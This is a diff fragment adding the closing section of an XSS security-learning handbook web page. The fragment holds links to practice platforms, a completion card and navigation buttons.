+                <li style="padding:8px 0;border-bottom:1px solid var(--border);color:var(--text-muted);">🎮 <a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">Google XSS Game</a> — Progressive XSS challenges</li>
+                <li style="padding:8px 0;border-bottom:1px solid var(--border);color:var(--text-muted);">🔒 <a href="https://owasp.org/www-project-webgoat/" target="_blank" rel="noopener">OWASP WebGoat</a> — Guided learning platform</li>
+                <li style="padding:8px 0;color:var(--text-muted);">📚 <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">PortSwigger Web Security Academy</a> — Free labs with solutions</li>
+            </ul>
+        </div>
+        <div class="card">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(213,0,0,0.15)">🔴</div>Advanced</div>
+            <ul style="list-style:none;font-size:0.88rem;">
+                <li style="padding:8px 0;border-bottom:1px solid var(--border);color:var(--text-muted);">🚀 <a href="https://www.hackthebox.com/" target="_blank" rel="noopener">HackTheBox</a> — Real-world web challenges</li>
+                <li style="padding:8px 0;border-bottom:1px solid var(--border);color:var(--text-muted);">💰 <a href="https://hackerone.com/" target="_blank" rel="noopener">HackerOne</a> — Live bug bounty programs</li>
+                <li style="padding:8px 0;color:var(--text-muted);">🎯 <a href="http://prompt.ml/" target="_blank" rel="noopener">prompt.ml</a> — Advanced XSS challenges</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- COMPLETION CARD -->
+    <div style="background:linear-gradient(135deg,rgba(0,200,83,0.08),rgba(108,99,255,0.08));border:2px solid rgba(0,200,83,0.35);border-radius:var(--radius-xl);padding:48px 36px;text-align:center;margin-top:50px;">
+        <div style="font-size:5rem;margin-bottom:16px;">🎉</div>
+        <h2 style="font-size:2rem;font-weight:900;margin-bottom:12px;background:linear-gradient(135deg,var(--success),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">Handbook Complete!</h2>
+        <p style="color:var(--text-muted);max-width:600px;margin:0 auto 24px;line-height:1.65;font-size:1rem;">
+            You've learned all 5 XSS types, practiced with 3 interactive labs, studied attack techniques, prevention strategies, and detection methodology. Now go build secure applications!
+        </p>
+        <div class="flex flex-center flex-gap-12 flex-wrap">
+            <button class="btn btn-primary" onclick="navigateTo(0)" style="font-size:1rem;padding:14px 28px;">📖 Review Again</button>
+            <button class="btn btn-outline" onclick="navigateTo(2)" style="font-size:1rem;padding:14px 28px;">🧪 Revisit Labs</button>
+            <a href="https://potdf.gitbook.io/bug-hunt-book/learning/xss-injection-handbook" target="_blank" rel="noopener noreferrer" class="btn btn-outline" style="font-size:1rem;padding:14px 28px;">
+                📖 Full Handbook ↗
+            </a>
+        </div>
+    </div>
+
+    <div class="page-nav">
+        <button class="btn btn-outline" onclick="navigateTo(7)">← Prevention</button>
+        <button class="btn btn-primary" onclick="navigateTo(0)">🏠 Back to Start</button>
+    </div>
+</div>
+
+<!-- ============================================================
+     END OF ALL PAGES
+     ============================================================ -->
+
+</main>
+
+<!-- Scroll to top -->
+<button class="scroll-top-btn" id="scrollTopBtn" onclick="scrollTop()">↑</button>
+
+<!-- JavaScript -->
+<script src="script.js"></script>
+
+</body>
+</html>
